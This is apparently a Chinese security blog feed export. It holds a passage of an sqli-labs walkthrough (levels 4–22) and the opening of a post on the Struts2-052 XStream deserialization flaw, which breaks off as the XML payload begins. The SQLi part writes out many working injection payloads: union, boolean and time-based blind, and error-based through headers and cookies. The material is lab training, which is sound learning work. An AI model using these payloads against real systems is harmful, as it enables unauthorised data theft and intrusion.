http://127.0.0.1/sqli-labs-master/Less-4/?id=-1<span class="string">")  union select 1,database(),user() --  #</span></span><br></pre></td></tr></table></figure></p><p>继续可以自己进行尝试。</p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>这个页面我们先说一下，无论我们id传的是多少，页面显示的都是YOU ARE IN……..没有输出！！！那我们怎么获取我们需要的数据信息！！！这个时候就只能盲注了，利用盲注来获取信息。<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>报错了less-1一样，可知sql语句应该是一样的所以我们可以利用一样的注入语句：<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">' order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>页面返回YOU ARE IN……..说明正常，报错了就说明不对。接下来因为没有输出所以我们进行盲注，根据返回有没有报错来判断我们的语句是否正确。<br>一些简单的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">'  and length(user())&gt;0  -- # //判断是否为mysql</span></span><br><span class="line"><span class="string">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1'</span>  and ord(mid(user(),1,1))=114  -- <span class="comment">#</span></span><br><span class="line">$  //返回正常说明数据库权限为root</span><br></pre></td></tr></table></figure></p><p>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1<span class="string">' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))&gt;105 -- #</span></span><br></pre></td></tr></table></figure></p><p>我们来看一下这个语句的原理：<br>首先是ord函数，mysql中ord和ascii函数一样是将字符转换为ascii码。<br>然后mid函数和substring一样是截取字符串的指定位置的字符的函数，比如上面我们mid(string,6,1)表示截取string这个字符串的第六位开始截取一个。然后中间是获取我们当前的数据库名，并转换为字符（as char）后面的0x20十六进制ascii表示空格。<br>最后利用获取到的acsii码和我们指定的ascii进行对比来一个一个获取我们的想要的信息。比如我们这里和105对比，如果正确就继续猜，可利用二分法猜解效率更高。这里我们可以尝试看到=105时返回正常，说明当前数据库名的第六个字符就是105，查询表可知就是i。和前面得出的数据库名对比：security<br>接下来可以利用返回的正确与否来一步一步猜解出我们所需要的信息。但是这样往往很耗费时间，手工来基本不太可能，所以一般都是利用工具来可以利用sqlmap。这里主要讲的是手工，所以就不演示了。</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>判断是否存在注入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-6/?id=1<span class="string">" and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>这里利用了sleep函数，基于时间的盲注。我们可以看到使用sleep函数后网站延迟了5秒说明我们插入的语句被执行了。存在注入。<br>这里就说说mysql中的sleep函数在注入中的作用，一般在页面说明一点返回都没有，所以语句都无返回的时候就会利用到sleep这个函数来确定我们的语句有没有被执行。一般基于布尔的盲注比基于时间的盲注少见很多。<br>Less-6和less-5基本相同，只是闭合用的符号不同。所以就不多说了。</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>判断注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>我们可以发现只有在加单引号后报错，但是这次后台对报错进行了处理，使我们无法从报错中得出敏感的信息，所有错误都显示语法错误。但是我们发现只有在加单引号后报错，加双引号或者其他的都不报错，所有这个单引号肯定有问题，我们利用单引号进行进一步注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">' and sleep(5) -- #</span></span><br></pre></td></tr></table></figure></p><p>发现还是错误，我感到十分奇怪，于是没有利用过滤，而是构造语句将后面的遗留的一个单引号闭合进行测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">' and sleep(5) or '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure></p><p>返回正常，并且浏览器睡眠5s，说明语句执行成功。这时候应该可以猜测应该是注释的符号被过滤的，我换url编码也不行。所以这里不能继续使用注释，需要自己构造将后面的单引号进行闭合。<br>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3<span class="string">' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure></p><p>正常返回，之后的注入就和之前的一样了。</p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>这一个和第七个其实差不多，主要就是把报错全部过滤了，如果错误就没有返回，正确就返回you are in……但是其实都一样，两个不同的返回我们就可以利用基于布尔的盲注进行测试：<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-8/?id=3<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>加单引号之后返回空白，说明报错，然后继续测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-8/?id=3<span class="string">' and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>这次可以使用注释。。。<br>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-8/?id=3<span class="string">'  AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105  -- #</span></span><br></pre></td></tr></table></figure></p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>哇，这一次很厉害了，无论输入什么返回都是一样的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>但是肯定是有注入的，这个测试肯定是无论输出什么直接一个echo。。所以我们使用sleep看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">' and sleep(5) and '</span>a<span class="string">'='</span>a</span><br><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">' and sleep(5) -- #</span></span><br></pre></td></tr></table></figure></p><p>果然，一次就中，很稳。还是存在注入的只是无法根据返回来判断，这就是典型的需要利用时间盲注的案例了。进一步获取信息：<br>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">'   AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>这个时候所以语句后面都必须加一个sleep函数根据相应时间来判断我们的语句是否正确。一般sleep的时间是传输时间来回的两倍。一般取5s。可以看到我们上面这个语句执行的时候相应了5s，说明我们猜测正确，如果换为=106则可以看到很快返回，说明我们的语句猜测错误。<br>可以看到我们time-base的耗时是很长了<br>往往获取一两kb的数据我们要好几个小时甚至好几天，所以这个时候我们就要选择重要的数据进行获取了，比如admin表里的username，password一类的数据了。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第十个只是换了个符号<br>检查是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-10/?id=3<span class="string">" and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>然后获取敏感数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-10/?id=3<span class="string">" AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>Ok了，和第九个基本一样。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>到了第11个就出新花样了，可以看到这次是登录框的注入。我们尝试一下万能密码<br>但是登录之后就刷新了不知道有没有成功，于是我们假设成功然后进一步测试使用order by。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-46e4ab422fd61120.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到原来在下面有一个报错框，这就很方便了我们继续猜测字段数发现order by 2的时候直接刷新情况说明就是 正确的了。字段数2，然后我们尝试进一步获取敏感信息，这时候也只能利用盲注，因为没有返回：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-878a551b4b0a62c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>如图，username利用万能密码绕过，然后下面的使用：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-51ec93b4c106ce93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>和之前的注入一样，只不过一个是get一个是post，注入的地点不一样了而已。也可以换一下使用username的框注入。只不过post的sleep的话会慢一点。</p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>这一次发现有点不一样我们，没事继续看看报错：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-9ee443a697902275.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>显示的语法错误处是：’order by 3 – #”) LIMIT 0,1’<br>可以猜测出闭合的类型需(“”)<br>继续：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c294c61a40e8451c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>好了！成功了，之后其实都一样了，就不演示了。</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>这个和上一个差不多：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-83ec6bfc60d21350.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>单引号加括号！</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>首先看看有没有报错，然后利用报错写植入语句，发现无论怎么写都没有报错，不存在报错，那就继续使用sleep或者用order by测试看看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-00628d5f425d6099.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>发现过滤报错并没有过滤完全，还是存在报错的，所以看出有注入点。接着进行注入。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7ba57cb8c34daa36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>Sleep函数也成功执行！<br>敏感信息查询：<br>这个也和上面的一样，只不过单引号换成了双引号，记住加sleep不然不能判断猜解是否正确。</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>这个同样没有报错，只能进行手工进行猜测，利用sleep函数进行测试。<br>实验发现这个注入和less-11的语句是一样的只不过没有报错，所以按less-11的注入语句即可。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b3fbe2436f19ba7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>使用下面的语句判断：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   <span class="string">' or 1=1 and  length(user())&gt;0 and sleep(5) -- #</span></span><br><span class="line"><span class="string">$   '</span> or 1=1 AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>Sleep了5s的时间。</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>这个很挺难猜的。不过也就几个组合，括号+单引号，括号+双引号，单引号，双引号。手工的话一般多猜解几次就可以猜出来的。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b8ee338d23bd5843.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>其他的就和之前的差不多了，注入语句稍微替换一下就行！</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这一个就有一些不一样了，可以看到首页显示的是[PASSWORD RESET]密码重置，。尝试一个万能密码和注入检查试试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-179a1bb4618ddbc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-db47a05136736161.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>哇，还被骂是辣鸡hacker，很难受。我们重新理一下思路，重置密码就是更新数据库里面的数据，这时候往往使用的是update语句，所以这时候我们使用之前的语句可能就会出错。<br>我们来猜测一下这个页面的sql语句是：update table set password=’newpassword’ where username = ‘name’;所以我们先猜测一个username然后进行后续的测试。<br>我们随机输入一个比如admin密码123456后提示密码更改成功，然后进一步尝试，用户名为admin在密码处进行注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   <span class="string">' or 1=1 and sleep(5) -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-2209fd13a9062258.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>Ok，可以看到成功注入了，这个时候利用盲注猜解来获取数据信息啦！<br>在实战过程中密码重置是一个很有可能出现sql注入漏洞的地方，所以之后可以重点关注！</p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>这个一进来就看到了ip，这个很可怕，所以我们在做测试的时候注意，很多时候我们的ip是会被监测的，所以尽量用虚拟机，anyway，想办法避免不必要的麻烦。废话不多说，继续测试.<br>但是我发现我试了很多方法都不行，卡了挺久的，无论是编码转换绕过还是宽字节注入都不行，最后实在不行先成功登陆了一个看一下，发现登陆成功后有这个提示框：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-fef08fd520fd6920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>思考思考，意思就是这里有输出的，your user agent。Agent！！好像挺熟悉的，在结合这个测试的题目叫header injection。是不是可以抓包冲user-agent来注入，然后输出我们需要的信息！！！！直接用burpsuite来试试：<br>登陆一个正确的用户，然后bp抓包更改user-agent为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   <span class="string">' and updatexml(1,concat(0x3a,database()),1))#</span></span><br></pre></td></tr></table></figure></p><p>这里输出三个的原因是我们useragent里面有三个字段，用前后两个1来占位输出。Concat是字符串连接的函数，0x3a是：的十六进制。<br>看看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-67e1b31cca83fdc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到我们查询的database()已经被输出出来了。现在我们可以利用这个输出我们想要获取的信息了。至于这个注入产生的原因我们可以看一下源码：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-0b3ae1a2fdb0d382.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到因为我们这里把我们登陆获取的user-agent信息给输入进了数据库，而这里的代码对我们传入的参数没有经过任何过滤或者检验。大家也可以看一下登录框的检验，利用了php中的很多检验函数，mysql_real_escape_string这个函数。然后检验主要是check_input这个函数，有兴趣的同学可以研究一下！</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>这个有上面的经验就不把目标放在登录框，我们先看看成功登陆的显示情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-e8aaeb744130987d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>返回的是url，很稳，很明显了我们的注入点就是头部的Referer部分，继续抓包重发一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  <span class="string">' or updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema="security" limit 0,1)),1))#  //获取表名</span></span><br><span class="line"><span class="string">$  '</span> or updatexml(1,concat(0x3a,(select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">"user"</span> <span class="built_in">limit</span> 0,1)),1))<span class="comment">#     //获取指定表字段名</span></span><br></pre></td></tr></table></figure></p><p>先讲一下语句，利用mysql自带的information_schema数据库获取数据，注意一定要加limit限制，因为只能一次一个数据，否则会报错。<br>查看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d9a15bc0530f810b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>后面的也不多说啦，大家可以自己尝试。</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>继续登陆一个正确的用户看看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-54419430d761835c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>我以为次会没有输出的，但是很意外，这次输出的数据有点多，但是很明显这次cookie就是目标了。看到提示cookie里面的信息有uname还有时间。Post传输的数据都在cookie里面，这次有点不一样，先登录，然后刷新，抓包：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7b85e41b52b58d1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>更改的是图中指出的部分！我们构造一下语句，其实这里就很好注入了，就和之前的注入语句一样：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  uname=qwe<span class="string">' union select 1,user(),database()-- #</span></span><br></pre></td></tr></table></figure></p><p>其实语句大家应该都很熟悉了。。。看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8764c5487130a13c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>好了，接下来就很简单了。</p><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>奋战奋战！！<br>看看登陆信息：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-0708b8b154278c89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这次的uname很奇怪，但是老司机一看就知道是编码转换之后的，所以试一试。果然是base64编码，所以这个其实和上一个差不多，只不过注入的时候转换一下编码就可以了！<br>这个的是利用单引号和括号闭合的，多尝试一下根据报错就会知道，这之前就说过所以不重复了。<br>抓包：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-312c3a5af82f31a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>更改cookies就可以。<br>注入语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  cXdlJykgdW5pb24gc2VsZWN0IDEsdXNlcigpLGRhdGFiYXNlKCktLSAj</span><br><span class="line">$  //就是20题的qwe<span class="string">') union select 1,user(),database()-- #</span></span><br></pre></td></tr></table></figure></p><p>抓包重发：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-86262ccae459c365.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>出来了。</p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>先看看登陆情况，发现和上一个一样，所以没什么新奇的，写语句base64转换一下，然后根据报错猜测应该是双引号闭合的，所以其他都很简单了。<br>语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   InVuaW9uIHNlbGVjdCAxLHVzZXIoKSxkYXRhYmFzZSgpIw==</span><br><span class="line">$   //“union select 1,user(),database()<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a71ec611ea20cb1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>好了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>Task1就结束了因为还有其他任务所以后面的一些可能晚一点写了上传，如果有问题可以找我啊，一起学习！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-lab实验Task1（less1-22）&quot;&gt;&lt;a href=&quot;#Sqli-lab实验Task1（less1-22）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab实验Task1（less1-22）&quot;&gt;&lt;/a&gt;Sqli-lab实验T
      
    
    </summary>
    
      <category term="攻防实验" scheme="http://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="http://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-052漏洞学习及反弹shell试验</title>
    <link href="http://rliyuqing.github.io/2019/04/15/4.%20Struts2-052%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E8%AF%95%E9%AA%8C/"/>
    <id>http://rliyuqing.github.io/2019/04/15/4. Struts2-052漏洞学习及反弹shell试验/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:48:27.057Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="Struts2-052漏洞学习"><a href="#Struts2-052漏洞学习" class="headerlink" title="Struts2-052漏洞学习"></a>Struts2-052漏洞学习</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="Struts是什么？"><a href="#Struts是什么？" class="headerlink" title="Struts是什么？"></a>Struts是什么？</h3><p>Struts是一个特别常用的开源web框架，用于扩展JAVA Servlet API并使用了模型（M），视图（V），控制（C）体系结构。使用这个框架，我们可以用各种标准技术（如 JSP、JavaBeans、XML等）创建可维护、可扩展并且灵活的 Web 应用程序。可以说用struts来开发java web应用程序是很简单，但是效率又很高。<br>之后，Struts的Java EE Web框架的团体，决定合作共同开发一个新的，整合了WebWork与Struts优点，并且更加优雅、扩展性更强的框架，命名为“Struts 2”，原Struts的1.x版本产品称为“Struts 1”。Struts项目并行提供与维护两个主要版本的框架产品——Struts 1与Struts 2。所以struts项目的两个产品就是 struts1和struts 2。<br>维基百科：“它通过采用Java Servlet／JSP技术，实现了基于Java EE Web应用的Model-View-Controller（MVC）设计模式的应用框架，是MVC经典设计模式中的一个经典产品。”<br>使用 Struts 时，此框架将为您提供一个控制器 Servlet (ActionServlet)，它在 IDE 中包含的 Struts 库中定义，并自动在 web.xml 部署描述符中注册，就下面这个：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-508e98961b35075e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>该控制器 Servlet 使用 struts-config.xml 文件将传入请求映射到 Struts Action 对象，并实例化与暂时存储窗体数据的操作相关联的任何 ActionForm 对象。Action 对象在使用窗体 Bean 中存储的任何数据的同时，使用其 execute 方法处理请求。一旦 Action 对象处理了请求，它就将存储任何新数据（即，存储在窗体 Bean 或单独的结果 Bean 中），并将结果转发到相应的视图中。</p><h3 id="Struts2-052是什么漏洞？"><a href="#Struts2-052是什么漏洞？" class="headerlink" title="Struts2-052是什么漏洞？"></a>Struts2-052是什么漏洞？</h3><p>s2-052漏洞是当用户使用带有XStream组件的Struts-REST插件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码。导致攻击者可以构造恶意xml payload导致RCE（远程代码执行）。<br>相对于之前struts2爆出来的漏洞来说，s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">·漏洞描述：Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。</span><br><span class="line">·漏洞编号：CVE-2017-9805</span><br><span class="line">·漏洞作者：lgtm.com的安全研究员</span><br><span class="line">·影响版本：Version 2.5.0 to 2.5.12 和 Version 2.3.0 to 2.3.33</span><br><span class="line">·漏洞等级：高危</span><br></pre></td></tr></table></figure></p><h2 id="分析漏洞原理"><a href="#分析漏洞原理" class="headerlink" title="分析漏洞原理"></a>分析漏洞原理</h2><h3 id="struct2-052漏洞产生的原因是什么？"><a href="#struct2-052漏洞产生的原因是什么？" class="headerlink" title="struct2-052漏洞产生的原因是什么？"></a>struct2-052漏洞产生的原因是什么？</h3><p>这个漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。<br>其实简单来说原因有两个：一个是 Struts2 REST插件(struts2-rest-plugin-2.x.jar)本身没有对进入的数据进行安全检查，导致攻击者可以传入恶意的xml对象可以传入到XStream里。另一个是XStream在反序列化传入的xml造成的远程代码执行。</p><h3 id="一个系统存在这个漏洞会导致什么后果？"><a href="#一个系统存在这个漏洞会导致什么后果？" class="headerlink" title="一个系统存在这个漏洞会导致什么后果？"></a>一个系统存在这个漏洞会导致什么后果？</h3><p>当使用带有XStream处理程序的Struts REST插件来处理XML有效负载时，可能会发生远程执行代码攻击。这会使攻击者可以通过任意恶意代码来接管服务器，获取服务器的权限。比如说执行一些eyi代，把木马文件写入服务器的主目录！写入主目录，这很可怕，写入小马之后获取权限。最后导致服务器被攻击者控制，造成信息泄露等，甚至攻击者利用服务器进行其他非法操作，利用该服务器攻击等。</p><h2 id="漏洞的重现和利用"><a href="#漏洞的重现和利用" class="headerlink" title="漏洞的重现和利用"></a>漏洞的重现和利用</h2><h3 id="下载java并配置环境"><a href="#下载java并配置环境" class="headerlink" title="下载java并配置环境"></a>下载java并配置环境</h3><p>这个应该很多朋友都做过，所以我也很早都已经配置好了，所以展示一下代码和配置环境变量的操作：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yum install java*jdk*devel*   //使用模糊匹配，搜索然后下载指定版本的</span><br><span class="line">$ //下载搜索到的最新的</span><br><span class="line">$ //这样的话就不用进行环境变量配置了</span><br></pre></td></tr></table></figure></p><p>还可以直接去sun网站上下载java然后手动安装，但需要修改环境变量。在/etc/profile.d/文件夹下添加一个java.sh文件，或者修改/etc/profile文件，两种方式都在文件中添加入java的classpath和path，然后输入命令：source  /etc/profile，即可使配置生效。</p><h3 id="下载tomcat并配置"><a href="#下载tomcat并配置" class="headerlink" title="下载tomcat并配置"></a>下载tomcat并配置</h3><p>执行命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo dnf install tomcat</span><br><span class="line">$ systemctl start tomcat</span><br></pre></td></tr></table></figure></p><p>然后需要在 /usr/share/tomcat/webapps目录下创建一个目录为ROOT（必须大写），然后访问127.0.0.1:8080便可以访问，但是因为里面是空的所以显示404，但是可以看到tomcat服务器信息：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-bda188ed7e155fb5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>最好是去官网下载对应的版本的tomcat的提示成功页面，网上下载后把下载的包里的webapps文件夹导入到虚拟机中的webapps目录就行。如果像我这样虽然tomcat成功配置了但是很可能导致后面openvas无法扫描到漏洞。官网下载对应版本的地址：<a href="http://tomcat.apache.org/，网站左边可以选择对应版本下载" target="_blank" rel="noopener">http://tomcat.apache.org/，网站左边可以选择对应版本下载</a><br>配置文件在 /etc/tomcat/tomcat.conf</p><h3 id="下载存在漏洞的struct2框架版本"><a href="#下载存在漏洞的struct2框架版本" class="headerlink" title="下载存在漏洞的struct2框架版本"></a>下载存在漏洞的struct2框架版本</h3><p>去官网下载该漏洞影响的最后一个版本的struts2框架，struts-2.5.12，然后解压后将apps目录下的struts2-rest-showcase.war和struts2-showcase.war文件放到webapps目录下（/Library/Tomcat/webapps）重启tomcat后访问：<br><a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-rest-showcase/</a><br><img src="http://upload-images.jianshu.io/upload_images/6269327-f2641781e53fcae9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="222.png"><br>可以看到已经搭建成功了。但是我进行操作时比如点击用户后的view进行操作时跳转404，经过测试只有切换成root用户之间登录fedora后才能进行操作。</p><h3 id="生成攻击payload"><a href="#生成攻击payload" class="headerlink" title="生成攻击payload"></a>生成攻击payload</h3><p>在操作页面编辑后点击submit，然后使用firefox编辑重发：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-43d5691268d9b30e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>将消息头中更改：<br>执行命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ Content-Type: application/xml</span><br></pre></td></tr></table></figure></p><p>更改request body为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; 